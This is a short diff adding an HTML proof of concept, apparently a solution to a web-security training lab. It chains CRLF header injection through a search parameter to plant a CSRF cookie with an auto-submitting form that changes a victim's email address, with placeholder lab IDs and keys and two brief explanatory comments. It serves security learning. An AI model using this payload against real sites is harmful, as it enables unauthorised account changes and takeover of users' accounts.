@@ -1,0 +1,11 @@
+<form method="POST" action="">
+    <input type="hidden" name="email" value="change@email.net">
+    <input name="csrf" value="csrf">
+</form>
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+
+
+
+
+///?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None -->in search term
+//the csrf is not associated with the session in fact it is with the csrf key
